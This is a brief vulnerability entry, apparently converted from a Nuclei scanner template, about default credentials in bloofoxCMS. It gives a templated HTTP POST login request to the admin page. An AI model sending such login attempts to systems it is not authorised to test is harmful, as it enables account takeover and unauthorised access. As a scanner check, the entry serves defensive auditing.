# Vulnerability: bloofoxCMS - Default Login
**Classification:** BLOOFOX
**Source:** Nuclei Template (`bloofoxcms-default-login.yaml`)

## Description
bloofoxCMS contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&action=login
```

